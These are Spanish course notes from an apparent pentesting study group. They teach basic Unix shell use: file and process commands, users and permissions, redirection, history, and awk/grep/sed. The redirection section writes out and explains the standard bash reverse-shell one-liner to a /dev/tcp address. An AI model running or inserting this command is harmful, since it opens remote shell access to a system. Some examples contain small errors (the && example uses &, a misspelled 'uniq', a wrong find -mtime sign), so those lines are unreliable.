# Unix Shell
#### PwnSh: Sesion 1.2
Youtube: https://youtu.be/Dojgyo1waLk
-----

## Índice
- [Unix Shell](#unix-shell)
      - [PwnSh: Sesion 1.2](#pwnsh-sesion-12)
  - [Índice](#índice)
  - [Introduccion](#introduccion)
  - [Comandos basicos](#comandos-basicos)
    - [Manejo de ficheros](#manejo-de-ficheros)
      - [CD](#cd)
      - [LS](#ls)
      - [PWD](#pwd)
      - [TOUCH](#touch)
      - [MKDIR](#mkdir)
      - [RM](#rm)
      - [RMDIR](#rmdir)
      - [MV](#mv)
      - [CP](#cp)
      - [CAT](#cat)
      - [LESS](#less)
    - [Gestion de Procesos](#gestion-de-procesos)
      - [PS](#ps)
      - [TOP](#top)
      - [KILL](#kill)
      - [KILLALL](#killall)
      - [PGREP](#pgrep)
      - [PKILL](#pkill)
    - [Gestion de usuarios](#gestion-de-usuarios)
      - [WHOAMI y ID](#whoami-y-id)
      - [SU](#su)
      - [SUDO](#sudo)
      - [USERADD](#useradd)
      - [USERD- EL](#userd--el)
      - [PASSWD](#passwd)
      - [USERMOD](#usermod)
      - [GROUPS](#groups)
      - [GROUPADD, GROUPDEL](#groupadd-groupdel)
      - [NEWGRP](#newgrp)
  - [Permisos](#permisos)
    - [Leer permisos](#leer-permisos)
  - [Cambiar permisos](#cambiar-permisos)
    - [CHMOD](#chmod)
  - [Gestion del flujo y Redireccion de datos](#gestion-del-flujo-y-redireccion-de-datos)
    - [Flujo de procesos](#flujo-de-procesos)
      - [\&\&](#)
      - [\&](#-1)
      - [CTRL+Z:](#ctrlz)
      - [FG](#fg)
      - [BG](#bg)
      - [PIPES](#pipes)
    - [Redireccion de Datos](#redireccion-de-datos)
      - [Entrada Estandard (stdin)](#entrada-estandard-stdin)
      - [Salida Estandard (stdout)](#salida-estandard-stdout)
      - [Salida de Error (stderr)](#salida-de-error-stderr)
      - [Combinar las Salidas](#combinar-las-salidas)
      - [Entender las redirecciones compejas](#entender-las-redirecciones-compejas)
      - [Dispositivos especiales](#dispositivos-especiales)
      - [Redireccion de Reverse Shell](#redireccion-de-reverse-shell)
  - [Historial](#historial)
    - [Comandos anteriores](#comandos-anteriores)
      - [History](#history)
      - [!!](#-2)
      - [!N](#n)
      - [:p](#p)
      - [!(?)string(?)](#string)
      - [Ctrl+R](#ctrlr)
    - [Parametros Anteriores](#parametros-anteriores)
      - [$!](#-3)
      - [!\*](#-4)
      - [!^](#-5)
      - [$\_ y !$](#_-y-)
  - [Comandos avanzados](#comandos-avanzados)
    - [Manejo del output](#manejo-del-output)
      - [AWK](#awk)
      - [GREP](#grep)
      - [SED](#sed)
      - [SORT - UNIQ - HEAD - TAIL - TR- WC](#sort---uniq---head---tail---tr--wc)
      - [FIND](#find)
  - [Conclusion](#conclusion)



## Introduccion
La Unix Shell aparecio en 1971 desarollada por Ken Thompson. Desde entonces es la base sobre la que se ha construido la gran mayoria del software.

Es muy util aprender a utilizar la shell de manera eficiente, ya que es donde pasamos la mayoria de nuestro tiempo como pentesters, analistas, desarolladores o entusiastas de la ciberseguridad y la tecnologia.

Un conocimiento definiciente sobre el uso de la shell puede llevar a la falsa creencia de que hay tareas imposibles o requieren scripts largos y complejos, cuando lo cierto es, que al igual que con python u otros lenguajes, la gran mayoria de cosas se pueden hacer en un *oneliner*.

Por todos estos motivos en PwnSh hemos decidido comenzar por aqui, explorando la shell y profundizando en el extenso mundo del Bash.


## Comandos basicos
### Manejo de ficheros
#### CD
```shell
cd directorio
```
Por defecto (si no se especifica directorio) cd toma por defecto "~" (directorio HOME del usuario actual).

Los subdirectorios se pueden anidar: directorio/subdirectorio/subsubdirectorio/etc/

Si quisieramos movernos al directorio padre habria que hacer cd a "..".
Y funciona con el anidamiento: ../../../ (en este caso: tres directorios mas atras).

Para volver al ultimo directorio visitado se puede hacer cd a "-".

#### LS
Se ejecuta de la siguiente manera:
```shell
ls directorio
```
Por defecto (si no se especifica directorio) ls toma por defecto "."(directorio actual)
Se le pueden especificar varios directorios uno detras del otro y listara el contenido de ellos.

**Flags:**
- l : modo lista (muestra informacion mas detallada: permisos, propietario, hora de ultima edicion, tamaño)
- a : muestra todos los archivos (incluidos los ocultos, que en sistemas linux son los que comienzan por un ".")
- h : humaniza el tamaño de los ficheros (mostrandolo en KB, MB, GB, etc)
- --color : resalta los tipos de archivo con distintos colores

*Ejemplo:*
```shell
ls -lah --color direcotrio/
```

*(Si te gusta como se ve esto, te recomiendo* lsd *, un paquete practicamente igual a ls con* -h --color *por defecto y un paquete de iconos bastante chulo)*

*(Tambien te recomiendo* tree *, un paquete que muestra directorios y archivos en formato arbol, muy util para visualizar)*

#### PWD
Se ejecuta de la siguiente manera:
```shell
pwd
```
No tiene flags ni argumentos ni flags, simplemente retorna la direccion absoluta del directorio actual.

#### TOUCH
Se ejecuta de la siguiente manera:
```shell
touch nombre_de_archivo
```

Crea un archivo o archivos con los nombres especificados.

#### MKDIR
Se ejecuta de la siguiente manera:
```shell
mkdir nombre_de_directorio
```
Crea un directorio o directorios con los nombres especificados
Con el flag -p creara los direcotios padres especificados en caso de que no existan.

#### RM
Se ejecuta de la siguiente manera:
```shell
rm archivo
```
Elimina el archivo o archivos especificados
**Flags:**
- r : modo recursivo (al especificarle un directorio elimina recursivamente todo su contenido si el directorio en si)
- f : modo forzoso (elimina cualquier cosa sin solicitar confirmacion)
- i : modo interactivo (te pregunta fichero a fichero si quieres eliminarlo)

Tecnicamente esto borra lo que sea siempre y cuando tengas permisos para ello:
```shell
rm -rf direcotrio archivo lo_que_quieras
```

#### RMDIR
Se ejecuta de la siguiente manera:
```shell
rmdir directorio
```
Basicamente es rm para directorios. Se diferencia de rm -r en que no es recursivo. Es decir, solo elimina directorios vacios. Es mas seguro para tratar con ficheros importantes.

#### MV
Se ejecuta de la siguiente manera:
```shell
mv archivo ruta/
```
Mueve el fichero especificado a la ruta especificada.

Si al mover especificas un nuevo nombre de archivo lo renombras:
```shell
mv archivo ruta/nuevo_nombre
```
**OJO:** Si el fichero existe lo sobreescribe!!

**Flags**:
- i : modo seguro (pregunta antes de sobreescribir).
- u : tan solo sobreescribe si el archivo origen es mas moderno que el destino (util para automatizar).

#### CP
Funciona exactamente igual que mv solo que copia en lugar de mover el archivo.
*Ejemplo:*
```shell
cp -i archivo ruta/
```

#### CAT
Se ejecuta de la siguiente manera:
```shell
cat archivo
```
Muestra el contenido del archivo o archivos especificados.

Con -n muestra el numero de linea.

#### LESS
Se ejecuta de la siguiente manera:
```shell
less archivo
```
Muestra el contenido del archivo especificado dentro de un entorno con scroll.

Se sale con la Q o Esc.
Con / puedes buscar.
Tiene mas controles y comandos de busqueda muy similares a vi.

Viene de otro comando llamado more, que solo podia hacer scroll hacia abajo

*(Si te gustaria que tuviera sintaxis, colores y una apariencia mejor prueba* bat *, es basicamente less y cat integrados con sintaxis y numeros de linea)*

### Gestion de Procesos
#### PS
Se ejecuta de la siguiente manera:
```shell
ps
```
Por defecto muestra los procesos del usuario que lo ejecuta.

**Flags:**
- e : muestra procesos de todos los usuarios.
- f : muestra los procesos con mas detalle.
- u usuario : muestra los procesos del usuario especificdo.

**Ejemplo:**
```shell
ps -fu root
```

#### TOP
Se ejecuta de la siguiente manera:
```shell
top
```
Por dejecto muestra todos los procesos.

**Flags:**
- d N : especifica una tasa de refresco en segundos.
- u usuario : muestra los procesos del usuario especificado.
- p PID,PID,PID, ... : filtra por PIDs

Interactividad (pulsando teclas en ejecucion):
- k : mandar señal kill, aparece un prompt donde introducir un PID y el tipo de señal que enviar (9 para softkill, 15 para hardkill)
- m : mostrar la memoria de forma distinta o no mostrarla directamente.
- M : ordenar los procesos por memoria
- n : definir un numero maximo de procesos que mostrar 
- N : ordenar por PID
- t : mostrar el uso de CPU y el numero de tasks de formas distintas o no.
- T : ordenar por tiempo
- P : ordenar por uso de cpu

*(Si te gustaria que tuviera mejor interantividad y apariencia prueba* htop *)*

#### KILL
Se ejecuta de la siguiente manera:
```shell
kill PID
```
Basicamente mata el proceso especificado.

Se puede, igual que en top, especificar el tipo de señal enviada con -9 o -15. Puedes ver todas las señales permitidas con -l.

#### KILLALL
Se ejecuta de la siguiente manera:
```shell
killall nombre
```

Mata todos los procesos con el nombre especificado.
Con -s N se puede especificar la señal que enviar como en los comandos anteriores. Se pueden listar las dispnibles con -l.


#### PGREP
Se ejecuta de la siguiente manera:
```shell
pgrep patron
```

Busca procesos segun el patron especificado:
- nombre : filtra seugn el nombre del proceso 
- -u usuario,usuario,... : filtra segun los usuarios especificados

Con -l podemos pedirle que muestre el nombre del comando completo a parte del PID.

*Ejemplo:*
```shell
pgrep python -u root -l
```

#### PKILL
Se ejecuta de la siguiente manera:
```shell
pkill patron
```

Basicamente es la version de pgrep que mata procesos en lugar de buscarlos.

### Gestion de usuarios
#### WHOAMI y ID
Se ejecutan por su nombre y muestran informacion del usuario que lo ejecuta.

- whoami muestra basicamente que usuario eres.
- id muestra uid y grupos

A id le puedes especificar otro usuario.

#### SU
Se ejecuta de la siguiente manera:
```shell
su usuario
```

Sirve para logearse con otro usuario desde la terminal

De esta forma, arrancaria tambien su entorno de inicio (directorio de inicio, configuracion y variables):
```shell
su - usuario
```

#### SUDO
Se ejecuta de la siguiente manera:
```shell
sudo comando
```

Permite ejecutar un comando como root.
Tambien se puede especificar un usuario distinto a root con -u usuario.

Los permisos para ejecutar este comando se configuran en /etc/sudoers con el editor de texto visudo para evitar problemas de seguridad.

#### USERADD
Se ejecuta de la siguiente manera:
```shell
useradd nombre
```

Añade un usuario con el nombre de usuario indicado.
Existen multitud de **flags** para especificar datos sobre el usuario:
- m : crea el directorio /home/usuario lo establece como el $HOME.
- s shell : permite especificar la shell.
- G grupo,grupo,grupo : permite especificar los grupos a los que pertenece.
- c descripcion : permite añadir una descripcion.
- u UID : permite especificar el UID
- d dir : especifica el $HOME si no se ha utilizado -m.

*Ejemplo:*
```shell
sudo useradd nuevo -m /user/bin/zsh -G wheel -c "nuevo usuario en el sistema" -u 1234
```

#### USERD- EL
Se ejecuta de la siguiente manera:
```shell
userdel usuario
```

Basicamente elimina usuarios del sisitema.

Con -r se elimina el $HOME y todos los archivos subyacentes.

#### PASSWD
Se ejecuta de la siguiente manera:
```shell
passwd
```

Sirve para establecer o modificar la contraseña del usuario que lo ejecuta.

Como root puedes especificar el usuario.
Tambien puedes obligarle a cambiarla en su proximo login con -e:
```shell
passwd -e usuario 
```

#### USERMOD
Se ejecuta de la siguiente manera:
```shell
usermod usuario modificaciones
```

Permite realizarle modificaciones a la informacion del usuario mediante:
- -aG grupo,grupo,.. : añade al usuario a los grupos indicados
- -G grupo,grupo,grupo,.. : sobreescribe los grupos del usuario con los indicados
- -d path/ : cambia el $HOME del usuario.
- -l nombre : cambia el nombre del usuario
- alguno mas para el resto de la informacion (consultar el man)

#### GROUPS
Se ejecuta de la siguiente manera:
```shell
groups usuario
```

Muestra los grupos a los que pertenece un usuario.

#### GROUPADD, GROUPDEL
Se ejecutan de la siguiente manera:
```shell
groupadd grupo
groupdel grupo
```

Añaden y eliminan grupos del sistema respectivamente.

#### NEWGRP
Se ejecuta de la siguiente manera:
```shell
newgrp grupo
```

Permite a un usuario moverse temporalmente a un grupo.

Si el grupo no tiene contraseña, como cualquier usuario menos root, te pedira que introduzcas una contraseña.

Esto se puede establecer con:
```shell
gpasswd grupo
```

## Permisos
Los permisos son un factor clave a la hora del manejo de ficheros y la ejecucion de comandos. Es esencial saber leerlos y modificarlos con facilidad.

### Leer permisos
Cuando hacemos un ls -l podemos observar que aparece una ristra de caracteres que combinan rwx-.
Realmente tambien puede aparecer d o l en el caracter de la izquiera del todo.

Son 10 caracteres:
- El primero representa el tipo de fichero: - para archivo, d para directorio, l para enlaces simbolicos.
- Los siguietes 9 son 3 sets de 3 caracteres:
    - Cada set representa de izquierda a derecha los permisos del propietario, del grupo propietario y del resto de usuarios.
    - Cada set se compone de 3 caracteres, cada caracter puere ser - o rwx segun le corresponda: siendo --- ningun permiso y rwx rodos los permisos
        - r significa read (lectura)
        - w significa write (escritura)
        - x significa execution (ejecucion)

Los permisos tambien pueden venir representados por un numero de tres cifras. Cada cifra, al igual que los sets de caracteres, representan los permisos del propietario, grupo y el resto respectivamente.
El valor de cada cifra se calcula en base a:
- Lectura: 4
- Escritura: 2
- Ejecution: 1

*Por tanto ningun permiso es 0, todos los permisos es 7 y y por ejemplo 6 seria lectura y escritura.*

## Cambiar permisos
### CHMOD
Se ejecuta de la siguiente manera:
```shell
chmod nuevos_permisos fichero
```

Los nuevos permisos se pueden indicar de forma octal o numerica o verbose.
Para formalizar la verbose se utiliza +, - e = y se representa al usuario por u al grupo por g y al resto por o.

*Por ejemplo:*
```shell
chmod 777 archivo
chmod u=rwx,g=rwx,o=rwx archivo

chmod 762 archivo
chmod u+rwx,g=rw,o-xw archivo
```

## Gestion del flujo y Redireccion de datos
Controlar el flujo de los procesos, su input y output, y la comunicacion entre ellos y la automatizacion de todo esto es lo que puede hacer mucho mas eficaz y eficiente nuestra experiencia dentro de una shell.

Por ello vamos a ver como se controla el flujo, luego como se redireccionan los datos y por ultimo algunos comandos y componentes especiales que facilitan el trabajo.

### Flujo de procesos
#### &&
Dentro de nuestra shell, el operador logico AND sirve para hacer literalmente un comando Y el siguiente.

Si el primer comando acaba correctamente, se ejecutara el siguiente, si el primer comando falla por algun motivo, el segundo no se realizara.

*Ejemplo:*
```shell
mkdir directorio & echo "directorio creado"
```

Si por algun motivo (que ya exista o no tengamos permisos) no se pudiese crear el directorio, podriamos ver que no se imprime el mensaje.

#### &
Si quisiesemos ejecutar independientemenete un comando de otro, podriamos utilizar un solo &.
*Ejemplo:*
```shell
touch fichero.txt & mkdir directorio
```
Esto tratara de crear tanto el fichero como el directorio independientemente de si ha podido crear fichero.txt.

Realmente lo que hace es enviar a segundo plano el primer proceso. Dejando el primer plano al segundo, no ejecuta uno y luego otro, si no con paralelismo.
Puedes comparar la diferencia asi:
*Ejemplo:*
```shell
sleep 4 && echo "Has esperado 4 segundos."
sleep 4 & echo "Espera 4 segundos...."
```

De la misma forma puedes utilizar un & al final de cualquier comando para pasarlo a segundo plano igual:
```shell
firefox &
```

De esta forma el proceso correria en segundo plano y mantendriamos el control de la terminal.

#### CTRL+Z:
Sirve para suspender un programa en seguno plano.

De forma similar al &, sobre un proceso corriendo, podemos presionar Ctrl+Z y esto enviara a segundo plano el proceso.

En lugar de dejarlo corriendo, lo deja suspendido en espera de volver a primer plano.

#### FG
Se ejecuta de la siguiente manera:
```shell
fg
```

Sirve para traer a primer plano el proceso en segundo plano.

#### BG
Se ejecuta de la siguiente manera:
```shell
bg
```

Sirve para continuar en segundo plano un proceso suspendido.

*Ejemplo:*
```shell
firefox
(Ctrl+Z) (la ventana de firefox deberia ser inutil)
bg (deberia volver a funcionar ahora)
```

#### PIPES
Los pipes son probablemente una de las herramientas mas utilizadas de todas las que vamos a dar.

El funcionamiento es sencillo: envia el output del primer comando como el input del segundo comando.
Se indica de la siguiente manera:
```shell
comando2 | comando2
```

Es muy util con los comandos de filtrado, busqueda y ordenamiento que vamos a ver mas adelante.

### Redireccion de Datos
#### Entrada Estandard (stdin)
Podemos indicar una entrada de input desde un fichero de la siguiente manera:
```shell
comando < entrada.txt
```

De esta forma, podemos pasarle a un script el contenido de un fichero.

Aunque muchos comandos aceptan directamente el nombre de archivo como argumento, esto es muy util para scripts, o para combinar varios archivos en un solo input:
```shell
cat archivo1.txt archivo2.txt | comando
```
Se podria hacer de la siguiente manera sin llamar a cat:
```shell
comando < archivo1.txt < archivo2.txt
```

Tambien es util con algunos dispositivos que veremos mas adelante.

A parte, tambien con << le puedes indicar un caracter o string de fin de archivo e introducir el input directamente desde terminal:
*Por ejemplo:*
```shell
comando << EOF
```

Esto leera tu input hasta que introduzacas EOF y lo tratara como un archivo

#### Salida Estandard (stdout)
Podemos redirigir la salida estandard de un comando de la siguiente manera:
```shell
comando >  salida.txt
```

Esto sobreescribe el fichero con la salida del comando ejecutado.

Si quieres añadirlo al final en lugar de sobre escribirlo puedes:
```shell
comando >> salida.txt
```

#### Salida de Error (stderr)
Se puede redirigir la salida de error de la siguiente manera:
```shell
comando 2> salida.txt
```
Y para añadir al final:
```shell
comando 2>> salida.txt
```
#### Combinar las Salidas
Se puede representar de varias formas. La mas sencilla:
```shell
comando &> salida.txt
```

Esto es lo mismo que:
```shell
comando > salida.txt 2>&1
```

Tambien se puede añadir al final como siempre, duplicando los >>. Tambien funciona como >&.

#### Entender las redirecciones compejas
Existen 3 descriptores de fichero por defecto:
- 0 : Entrada estandard (stdin)
- 1 : Salida estandard (stdout)
- 2 : Salida de error (stderr)

Cuando te encuentras redirecciones de tipo: N>&M,  lo que esta es redirigiendo la salida N al mismo lugar que la salida M, como puedes ver en el ejemplo de Combinar las Salidas.


Tambien se pueden crear descriptores de ficheros propios para redirecciones mas complejas.

#### Dispositivos especiales
Hay ciertos dispositivos especiales que otorgan funcionamientos especificos de cara a la redireccion.

- /dev/null :la "basura", es una forma util de eliminar cierta parte del output o callar comandos (&> /dev/null)
- /dev/tcp/ip/puerto : representa una conexion tcp hacia fuera con el peurto y la ip especificadas
- /dev/udp/ip/puerto : representa una conexion udp hacia fuera con el puerto y la ip especificadas
- /dev/stdout , /dev/stdin, /dev/stderr : las representaciones literales de la salida y entrada.
- /dev/fd/N : si N es un numero valido, representa los descriptores de fichero propios.

#### Redireccion de Reverse Shell
Para poner un ejemplo real, la tipica reverse Shell de bash:
```shell
bash -i >& /dev/tcp/ip/puerto 0>&1
```
Entonces:
- bash -i: : Inicia una instancia interactiva de bash.
- \>& /dev/tcp/ip/puerto : envia la salida de error y estandard por la conexion TCP
- 0>&1 : redirige la entrada estandard hacia el mismo destino que la salida estandard.

En resumen estamos enviando todas las entradas y salidas por el dispositivo /dev/tcp/ip

## Historial
### Comandos anteriores
#### History
Se ejecuta de la siguiente manera:
```shell
history
```
Por defecto muestra los comandos mas recientes.
Se le pude especificar un tipo:
```shell
history N
```

Esto mostrara los comandos hasta desde la entrada numero N hasta la actual.
Tambien se puede añadir un N negativo y mostrara los ultimos N comandos.

#### !!
!! representa el comando inmediatamente anterior.
Muy util para corregir o añadir cosas o cuando un comando requiere sudo y te enteras a posteriori:
```shell
sudo !!
```

Se pueden aplicar sustituciones rapidas de la siguiente forma:
```shell
!!:s/patron/sustituto/
```

Hay mas formas de realizar estas sustituciones, se parece mucho a sed, pero no creo que sea necesario realizar sustituciones complejas de esta forma. 

#### !N
!N representa el comando numero N en el historial.
Al igual que al comando history se le puede pasar numeros negativos para hacer el comando de hace N comandos en lugar de utilizar entradas absolutas.

#### :p
De forma similar a como empezabamos las sustituciones, podemos hacer que el comando, en lugar de ejecutarse, se imprima por pantalla y se convierta en la ultima entrada del historial.
```shell
!!:p
```

Esto puede ser muy util si no estamos seguros de a que comando estamos llamando y no queremos ejecutar nada sin querer, o, por ejemplo, para acceder rapido a el mas adelante.

#### !(?)string(?)
!string representa el ultimo comando que **empiece** por el string indicado.

Al añadir las interrogaciones(!?string?) indicamos el primero comando que **contenga** el string.

#### Ctrl+R
Entras en el modo de busqueda inversa, basicamente busca en el historial lo que vayas escribiendo y con tabulador, si es el resultado correcto puedes completarlo.

### Parametros Anteriores
#### $!
Contiene el UID del ultimo comando lanzado.
Util para matar un proceso si se ha cometido errores al lanzarlo, por ejemplo

```shell
comando
kill $!
```

#### !\*
Representa todos los argumentos utilizados en el comando anterior como un string, incluyendo las redirecciones y su puntacion.

#### !\^
Rrepresenta el primer argumento utilizado en el comando anteiror como un string

#### $_ y !$
Son dos formas de representar el ultimo argumento utilizado.

Uno es una funcionalidad de bash y el otro una funcionalidad del historial, lo cual significa que manejan distinto cual es el ultimo comando y argumento.

$_ no entiende de redirecciones, es decir, tomara el ultimo comando antes de la redireccion. Al concatenar varios comandos, al ser una funcionalidad de bash, no del historial, tomara el comando anterior en la cadena como el ultimo comando

!$ si entiende de redirecciones pero no conoce el comando que estas ejecutando, solo el historial. Esto quiere decir que concatenes los comandos que concatenes, !$ siempre va a interpretar la entrada anterior en el historial.

*Ejemplos:*
```shell
echo "hola" > fichero.txt
echo $_ (hola)
echo "hola" > fichero.txt
cat !$ (contenido de fichero.txt)
echo "ejemplo" > $_
(crea un arhivo llamado ejemplo de contenido ejemplo)
echo "ejemplo2" 
echo "ejemplo1" && echo !$ (ejemplo2 ejemplo1)
echo "ejemplo3"
echo "ejemplo4" && echo $_ (ejemplo4 ejemplo4)
```

## Comandos avanzados
La clave para maximizar el uso de la shell es el filtrado de la salida de los comandos.

Hay comandos que otorgan salidas grandisimas, ficheros de log tremendamente largos e ilgeibles.

Saber filtrar la salida de los comandos ahorra tiempo de scroll y busqueda manual y abre las puertas a muchas posibilidades de automatizacion.

En mi opinion para trabajar comodamente con ello hay que conocer minimo:
AWK, GREP, SED, SORT, CUT, UNIQ, TR, WC, HEAD y TAILS

Tambien es util conocer find para mejorar la busqueda de ficheros

En esta seccion sera imprescindible practicamente el uso de pipes.

### Manejo del output
#### AWK
Awk es sin duda el mas potente y hablar de toda su funcionalidad mereceria sus propios apuntes y clase.

Es practicamente un lenguaje de programacion que itera sobre cada linea de un fichero: tiene condicionales, variables, funciones, etc.

Para lo que se suele utilizar es para el manejo de las filas de un archivo por columnas.

Se ejecuta de la siguiente manera:
```shell
awk 'patron {accion} patro {accion} ...' fichero
```

Cuando la linea coincide con el patron, realiza la accion indicada con llaves detras y asi sucesivamente. Si se añade una accion sin patron previo sera el patron para cuando no coincide con ningun patron indicado.

El patron se puede indicar con regex o utilizando las variables propias de AWK. Se puede utilizar END y BEGUIN para la primera y ultima linea

Awk interpreta cada fila por columnas separadas el separador indicado (por defecto espacio) y atribuye a cada valor una variable. Las variables son representadas por $ y su numero de columna.

Tamien tiene dos variables que recogen el numero de registro (linea) representado por NR y el numero de campos (cantidad de columnas) representado por NF

Para indicar un separador distinto se puede utilizar el flag -F

*Ejemplo:*
```shell
awk '/hola/ {print}' archivo.txt
(imprime lineas que contienen hola)
awk '{print $1} archivo.txt
(imprime la primera columna de todas las filtas)
awk '/hola/ {saludos+=1} END {print saludos}
(imprime el numero de 'hola's encontrados)
awk 'NF>3 {print $4}'
(si la fila es mas larga que 3 columnas imprime la 4rta)
```

#### GREP
Es un comando de busqueda dentro de ficheros.
Se ejecuta de la siguiente manera:
```shell
grep opciones patron archivo
```

Las opciones mas populares y utiles son:
- i : busqueda insensible a mayusculas y minusculas
- r : aplica recursividad a directorios
- v : busqueda inversa (muestra lineas que no coincidan)

El patron se puede indicar por regex o strings.

#### SED
Es un comando para realizar transformaciones dentro de ficheros.
Puede buscar y reemplazar, eliminar o añadir lineas y otras operaciones de edicion de texto.
Se ejecuta de la siguiente manera:
```shell
sed opciones 'comando' archivo
```

Por defecto imprime la version modificada por consola, con -i indicamos que edite el fichero con las trasnformaciones que especifiquemos.
Con -e se le pueden especificar mutiples comandos. Con -n podemos indicar que solo muestre las lineas donde ha aplicado el comando en lugar de todas.

El comando se constituye de la siguiente manera:
- Para busqueda y reemplazo: s/busqueda/reemplazo/
- Para eliminar: /busqueda/d

Por defecto la sistitucion solo aplica a la primera coincidencia dentro del la linea, con una g a final podemos hacer que aplique a todas las coincidebncias.

Por defecto es sensible a mayusculas, podemos cambiarlo con una I al final.

*Ejemplo:*
```shell
sed -i 's/palabra1/palabra2/gI' archivo.txt
```
#### SORT - UNIQ - HEAD - TAIL - TR- WC
En trim defines 2  separadores y separa el contenido entre los primeros separadores y los separa con los segundos.
*Ejemplo: Separar un texto por palabras en distintas lineas:*
```shell
cat archivo.txt | tr " " "\n"
```

Sort basicamente ordena, tiene flags -n para numericamente, -M que reconoce meses escritos : JAN < DEC, ..
Pero los **flags** mas importantes son:
- f : ignora las mayusculas.
- d : modo dicionario, ignora las puntuaciones ¿?,.
- r : cambia de mayor a menor a menor a mayor.
- o {archivo} : guarda los resultados en un fichero.
- u : agrupa los duplicados en unicos.

*Por ejemplo: agrupar las palabras de un texto y ordenarlas de la z a la a:*
```shell
cat archivo.txt | tr " " "\n" | sort -fdru
```

Si la parte de unificar las palabras en iguales no funciona como esperas con sort -u, puedes utilizar uniq que otorga cierto grado de configuracion:
- c : cuenta el numero de ocurrencia
- d : solo printea las que tienen duplicadas
- D : imprime todas las lineas duplicadas
- i : ignora mayusculas
- s {int} : permite saltarse los primeros n caracteres y ordenar en base a mas adelante
- w {int} : comparar solo n caracteres

*El ejemplo de antes pero con el numero de coincidencias y sin las palabras que solo aparecen una vez:*
```shell
cat archivo.txt | tr " " "\n" | sort -fdr | uniq -cid
```

Head y Tails permiten recortar la salida por arriba o por abajo respectivamente indicando:
- c : numero de caracteres
- n : numero de lineas

*Ejemplo: las 15 primeras lineas del output anterior*
```shell
cat archivo.txt | tr " " "\n" | sort -fdr | unisq -cid | head -n 15
```

Con wc se pueden contar:
- w : numero de palabras
- l : numero de lineas
- c : numero de bytes

*Ejemplo: numero de palabtas del archivo*
```shell
cat archivo.txt | wc -w
```

#### FIND
Es una herramiente presente en casi todos los sistemas unix y es una herramienta poderosisima, no para filtrar datos como las anteriores, si no para buscar archivos y directorios.

Se utiliza asi:
```shell
find [flags] ruta/sobre/la/que/buscar [patrones de busqueda]
```
Flags:
- -L : seguir a los enlaces simbolicos(accesos directos)
- alguno mas de debuggin y eso
Patrones:
- -name {nombre} : busca archivos o directorios que coincidan por nombre
- -iname {nombre} : igual pero sin ser sensible a mayusculas
- -type {tipo} : tipo de archivo (los mas comunes son d (directorios) y f (ficheros))
- -user {usuario} : pertenecientes al usuario especificado
- -size {tamaño} : k para kilobytes, M para megabytes, se puede poner + o - delante para especificar mayor o menor que
- -mtime {dias} : usa + y - como en size
- muchas mas, mirar el man, de verdad que es potentisima

*Ejemplo: Encontrar archivos de un usuario llamado paco en todo el sistema de hace menos de una semana mas grandes de 20k*
```shell
find /* -user paco -size +20k -mtime +7
```

Paquete recomendado: fzf

## Conclusion
Espero que hayas podido aprender algo sobre la terminal o aclarado posibles dudas.

No dudes en hacer pullrequest con cualquier cosa que te gustaria ver corregida.

Un saludo.
